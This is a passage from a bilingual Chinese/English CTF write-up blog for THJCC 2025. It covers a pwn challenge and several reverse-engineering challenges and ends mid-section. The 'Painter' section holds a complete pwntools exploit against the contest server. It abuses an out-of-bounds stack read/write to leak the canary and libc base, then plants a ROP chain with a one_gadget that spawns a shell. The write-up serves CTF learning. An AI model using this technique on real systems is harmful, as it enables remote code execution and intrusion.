    </span>        
    
</h4>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-7.png"
        alt="alt text"
      />
      
    </figure>

在第一次呼叫前jump slot裡面的address就都已經是binary的pie base了<br>
只要算offset加上去就好了</p>
<p>Before the first call, the addresses in the jump slots are already filled with the binary&rsquo;s PIE base.<br>
So we just need to calculate the offset and add it to the base.</p>


<h3 class="relative group">Painter 
    <div id="painter" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#painter" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>我這題打造了一個類似stack的操作來存放資料，但沒限制可使用的範圍<br>
I built a stack-like structure to store data in this challenge,<br>
but there is no restriction on the accessible range.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-6.png"
        alt="alt text"
      />
      
    </figure>

我們可以透過<code>new</code> 到超過 collection[] 大小來做oob read/write(對，又是oob)
在stack上面read/write可以很直覺的聯想到蓋一個rop + one_gadget就可以RCE了</p>
<hr>
<p>We can use <code>new</code> to exceed the size of <code>collection[]</code>, allowing out-of-bounds (oob) read/write access (yes, it&rsquo;s oob again).<br>
Reading/writing on the stack naturally leads to the idea of crafting a ROP chain + <code>one_gadget</code> to achieve RCE.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chal.ctf.scint.org&#39;</span><span class="p">,</span> <span class="mi">10006</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># context.arch = &#34;amd64&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="n">unpack</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">9</span><span class="p">],</span> <span class="mi">64</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">__libc_start_main_128</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">__libc_start_main_128</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl"><span class="n">writable_buffer</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x500</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;canary: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">0xebc88 execve(&#34;/bin/sh&#34;, rsi, rdx)
</span></span></span><span class="line"><span class="cl"><span class="s1">constraints:
</span></span></span><span class="line"><span class="cl"><span class="s1">  address rbp-0x78 is writable
</span></span></span><span class="line"><span class="cl"><span class="s1">  [rsi] == NULL || rsi == NULL || rsi is a valid argv
</span></span></span><span class="line"><span class="cl"><span class="s1">  [rdx] == NULL || rdx == NULL || rdx is a valid envp
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">0x00000000000904a9 : pop rdx ; pop rbx ; ret
</span></span></span><span class="line"><span class="cl"><span class="s1">0x000000000002be51 : pop rsi ; ret
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_pop_rbx_ret</span> <span class="o">=</span> <span class="mh">0x00000000000904a9</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x000000000002be51</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0xebc88</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">paint_1</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">writable_buffer</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_pop_rbx_ret</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">paint_2</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)]</span> <span class="o">*</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">paint_1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">paint_2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>

<h2 class="relative group">Reverse 
    <div id="reverse" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#reverse" aria-label="Anchor">#</a>
    </span>        
    
</h2>


<h3 class="relative group">西 
    <div id="%E8%A5%BF" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#%E8%A5%BF" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>複習一下gcc編譯器的過程</p>
<p>preprocess -&gt; compile -&gt; assemble -&gt; link</p>
<p>其中，preprocess可以把#開頭的東西展開<br>
你可以用<code>gcc -E</code>來preprocess你的source code</p>
<hr>
<p>Review the compilation process of the GCC compiler:</p>
<p>preprocess -&gt; compile -&gt; assemble -&gt; link</p>
<p>Among these steps, the <code>preprocess</code> stage expands everything starting with <code>#</code>.<br>
You can use <code>gcc -E</code> to preprocess your source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -E chal.c -o chal.s  
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp"># 0 &#34;chal.c&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"># 0 &#34;&lt;built-in&gt;&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"># 0 &#34;&lt;command-line&gt;&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="p">...(</span><span class="n">skipped</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp"># 539 &#34;/usr/include</span><span class="cpf">/string.h&#34; 3 4</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp"># 4 &#34;chal.c&#34; 2
</span></span></span><span class="line"><span class="cl"><span class="cp"># 25 &#34;chal.c&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp"># 25 &#34;chal.c&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">enrypted_flag</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">decrypt</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span> <span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">enrypted_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xF5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">decrypt</span><span class="p">(</span><span class="nf">strlen</span><span class="p">(</span><span class="n">enrypted_flag</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">enrypted_flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>把0改成1即可<br>
Simply change 0 to 1.</p>


<h3 class="relative group">flag checker 
    <div id="flag-checker" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#flag-checker" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>這題如果不用AI打的話，應該有一點難度<br>
This challenge would definitely be a bit difficult without AI&rsquo;s assistance.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-8.png"
        alt="alt text"
      />
      
    </figure>

把每個<code>s[i]</code>ROR<code>i</code>個bit<br>
Rotate each <code>s[i]</code> by <code>i</code> bits using a right rotation (ROR).</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-9.png"
        alt="alt text"
      />
      
    </figure>

他把陣列拆成20組，每組3個判斷式來判斷<br>
這邊可以簡單用聯立表達<br>
He splits the array into 20 groups, with each group having 3 conditions for evaluation. This can be simply expressed using a system of equations.</p>
<p>$$
\left{
\begin{aligned}
S_{i} + S_{i + 1} = k_{i}  \
S_{i + 1} + S_{i + 2} = k_{i+1}  \
S_{i} + S_{i + 2} = k_{i+2}  \
\end{aligned}
\right.
$$</p>


<h4 class="relative group">sol 
    <div id="sol-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#sol-1" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>$$ 2(S_{i} + S_{i + 1} + S_{i + 2}) = k_{i} + k_{i+1} + k_{i+2} $$
$$ \Rightarrow $$
$$ S_{i} = \frac{k_{i} + k_{i+1} + k_{i+2}}{2} - (S_{i + 1} + S_{i + 2}) $$
$$ S_{i + 1} = \frac{k_{i} + k_{i+1} + k_{i+2}}{2} - (S_{i} + S_{i + 2}) $$
$$ S_{i + 2} = \frac{k_{i} + k_{i+1} + k_{i+2}}{2} - (S_{i} + S_{i + 1}) $$</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="mi">250</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">155</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">165</span><span class="p">,</span> <span class="mi">181</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">369</span><span class="p">,</span> <span class="mi">449</span><span class="p">,</span> <span class="mi">352</span><span class="p">,</span> <span class="mi">315</span><span class="p">,</span> <span class="mi">355</span><span class="p">,</span> <span class="mi">418</span><span class="p">,</span> <span class="mi">247</span><span class="p">,</span> <span class="mi">359</span><span class="p">,</span> <span class="mi">388</span><span class="p">,</span> <span class="mi">341</span><span class="p">,</span> <span class="mi">372</span><span class="p">,</span> <span class="mi">289</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">385</span><span class="p">,</span> <span class="mi">372</span><span class="p">,</span> <span class="mi">477</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">80</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">data_convert</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ab</span><span class="p">,</span> <span class="n">bc</span><span class="p">,</span> <span class="n">ca</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">abc</span> <span class="o">=</span> <span class="p">(</span><span class="n">ab</span> <span class="o">+</span> <span class="n">bc</span> <span class="o">+</span> <span class="n">ca</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">data_convert</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">abc</span> <span class="o">-</span> <span class="n">bc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data_convert</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">abc</span> <span class="o">-</span> <span class="n">ca</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data_convert</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">abc</span> <span class="o">-</span> <span class="n">ab</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">data_convert</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0xf</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="p">(((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">t</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="o">-</span><span class="n">t</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span></code></pre></div>

<h3 class="relative group">noodle 
    <div id="noodle" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#noodle" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-11.png"
        alt="alt text"
      />
      
    </figure>

首先expand這邊會把字串展開成bit<br>
First, the expand part will expand the string into bits.

    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-12.png"
        alt="alt text"
      />
      
    </figure>

然後swap bits<br>
Then, swap the bits.

    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-13.png"
        alt="alt text"
      />
      
    </figure>

最後壓縮起來<br>
Finally, compress it back.</p>


<h4 class="relative group">sol 
    <div id="sol-2" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#sol-2" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>因為是交換同byte裡面的bit，所以可以暴力搜尋<br>
Since the bits within the same byte are swapped, a brute force search can be used.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="s2">&#34;2a48589898decafcaefa98087cfa58ae9e2afa1c1aaa2e96fa38061a9ca8fa182ebeee&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">alpha</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
</span></span><span class="line"><span class="cl"><span class="n">enc_alpha</span> <span class="o">=</span> <span class="s2">&#34;0686169626a636b646c68c1c9c2cac3cbc4ccc5cdc6cec7cfc0e8e1e9e2eae3ebe4ece5e88189828a838b848c858d868e878f80a8a1a9a2aaa3aba4aca5a84149424a434b444c454d464e474f456d666e676f608da6aea7afa0cde6eee7e&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dec</span> <span class="o">=</span> <span class="p">{</span><span class="n">a</span><span class="p">:</span><span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">enc_alpha</span><span class="p">),</span> <span class="n">alpha</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dec</span><span class="p">[</span><span class="n">ch</span><span class="p">]</span> <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">cipher</span><span class="p">))</span>
</span></span></code></pre></div>

<h4 class="relative group">sol2 
    <div id="sol2" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#sol2" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>這個binary的encryption用的是involutory cipher，把密文丟回去就可以拿到明文了<br>
This binary encryption uses an involutory cipher, meaning that by putting the ciphertext back, you can retrieve the plaintext.</p>


<h3 class="relative group">empty 
    <div id="empty" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#empty" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-14.png"
        alt="alt text"
      />
      
    </figure>
</p>
<p><code>sub_1060</code>被改成<code>rwx</code><br>
然後被和<code>unk_4045</code>xor</p>
<p><code>sub_1060</code> has been changed to <code>rwx</code> and then XORed with <code>unk_4045</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">100</span><span class="n">i</span> <span class="err">$</span><span class="n">pc</span>
